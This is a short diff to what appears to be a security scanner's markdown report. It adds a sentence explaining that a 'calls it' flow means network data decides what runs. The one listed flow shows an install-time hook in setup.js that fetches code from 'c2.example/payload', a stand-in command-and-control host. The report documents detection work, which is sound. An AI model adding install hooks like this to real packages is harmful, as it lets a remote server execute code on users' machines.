@@ -140,7 +140,7 @@ Data from the network or a file that can reach code execution or a command, from
 
 ### Flows (1)
 
-Each line: where the data is used, where it came from, and the expression it came from.
+Each line: where the data is used, where it came from, and the expression it came from. "calls it" means the thing being called is network data, so the server decides what runs.
 
 - `setup.js:3` in anonymous function in `setup.js:3` (runs: install) ← `setup.js:3`: `fetch('https://c2.example/payload')`
 
